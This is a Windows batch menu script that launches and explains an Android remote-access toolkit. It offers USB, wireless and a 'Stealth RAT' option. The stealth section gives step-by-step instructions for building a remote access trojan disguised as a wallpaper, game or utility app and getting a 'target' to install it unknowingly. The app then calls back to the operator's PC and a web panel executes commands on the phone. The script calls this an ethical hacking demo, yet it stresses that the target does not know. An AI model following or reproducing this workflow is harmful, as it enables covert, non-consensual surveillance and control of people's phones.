@echo off
title Android Remote Access - USAGE GUIDE
color 0A

:menu
cls
echo.
echo ========================================================
echo          HOW TO USE - CHOOSE YOUR METHOD
echo ========================================================
echo.
echo  METHOD 1: TRADITIONAL (Needs USB Debugging)
echo  -------------------------------------------
echo  [1] Launch Main Controller
echo      - Requires: USB cable + USB debugging ON
echo      - Use for: Quick testing, your own phone
echo      - Run: python phone_controller.py
echo.
echo  METHOD 2: WIRELESS (Setup once, use forever)
echo  -------------------------------------------
echo  [2] Launch Wireless Connector
echo      - Requires: USB first time only
echo      - Use for: Wireless control, same WiFi
echo      - Run: python wireless_connector.py
echo.
echo  METHOD 3: STEALTH RAT (UNIQUE - No USB Debugging!)
echo  ⭐ THIS MAKES YOUR PROJECT STAND OUT! ⭐
echo  -------------------------------------------
echo  [3] Launch Stealth RAT Builder
echo      - Requires: NOTHING from target!
echo      - Use for: Ethical hacking project demo
echo      - Run: python stealth_rat.py
echo.
echo  QUICK ACTIONS
echo  -------------------------------------------
echo  [4] Install Dependencies
echo  [5] Read Full Usage Guide
echo  [6] Exit
echo.
echo ========================================================

set /p choice="Enter choice (1-6): "

if "%choice%"=="1" goto method1
if "%choice%"=="2" goto method2
if "%choice%"=="3" goto method3
if "%choice%"=="4" goto install
if "%choice%"=="5" goto guide
if "%choice%"=="6" goto end
goto menu

:method1
cls
echo.
echo ========================================================
echo          METHOD 1: TRADITIONAL CONTROLLER
echo ========================================================
echo.
echo STEPS:
echo.
echo 1. Enable USB Debugging on your phone:
echo    Settings ^> About Phone ^> Tap Build Number 7 times
echo    Settings ^> Developer Options ^> USB Debugging ON
echo.
echo 2. Connect phone via USB cable
echo.
echo 3. On phone, tap "Allow USB Debugging" when prompted
echo.
echo 4. Press any key to launch controller...
echo.
pause
python phone_controller.py
goto menu

:method2
cls
echo.
echo ========================================================
echo          METHOD 2: WIRELESS CONNECTOR
echo ========================================================
echo.
echo FIRST TIME SETUP:
echo.
echo 1. Connect phone via USB (just this once!)
echo 2. Launch wireless connector
echo 3. Select option 3 (USB to Wireless)
echo 4. Follow prompts
echo 5. Disconnect USB - you're wireless!
echo.
echo FUTURE CONNECTIONS:
echo.
echo 1. Launch wireless connector
echo 2. Select option 1 (Saved Device)
echo 3. Done in 5 seconds!
echo.
echo Press any key to launch wireless connector...
echo.
pause
python wireless_connector.py
goto menu

:method3
cls
echo.
echo ========================================================
echo    METHOD 3: STEALTH RAT (UNIQUE PROJECT!)
echo ========================================================
echo.
echo ⭐ THIS IS YOUR SECRET WEAPON! ⭐
echo.
echo WHY IT'S UNIQUE:
echo   - NO USB debugging needed!
echo   - NO USB cable needed!
echo   - Target doesn't know!
echo   - Disguised as normal app!
echo.
echo STEPS:
echo.
echo 1. Build Stealth APK
echo    - Choose disguise (Wallpaper/Game/Utility)
echo    - Enter your PC IP address
echo    - APK created!
echo.
echo 2. Install on Target Phone
echo    - Send via Bluetooth/Email/USB
echo    - Target installs thinking it's normal app
echo    - Opens app - sees wallpaper/game
echo    - RAT activates in background!
echo.
echo 3. Start Control Server
echo    - Launch RAT server on your PC
echo    - Wait for connection
echo    - Control phone remotely!
echo.
echo 4. Use Web Control Panel
echo    - Open browser: http://localhost:8080
echo    - See connected devices
echo    - Execute commands!
echo.
echo Press any key to launch Stealth RAT builder...
echo.
pause
python stealth_rat.py
goto menu

:install
cls
echo.
echo ========================================================
echo          INSTALLING DEPENDENCIES
echo ========================================================
echo.
python quick_setup.py
pause
goto menu

:guide
cls
echo.
echo ========================================================
echo          READING FULL GUIDE
echo ========================================================
echo.
type HOW_TO_USE.md
echo.
echo.
echo Press any key to return to menu...
pause
goto menu

:end
cls
echo.
echo ========================================================
echo          QUICK REFERENCE
echo ========================================================
echo.
echo Traditional Control:    python phone_controller.py
echo Wireless Connect:       python wireless_connector.py
echo Stealth RAT (UNIQUE):   python stealth_rat.py
echo.
echo For your project demo, use METHOD 3 (Stealth RAT)!
echo It's unique and doesn't need USB debugging!
echo.
echo Good luck! 🚀
echo.
timeout /t 3
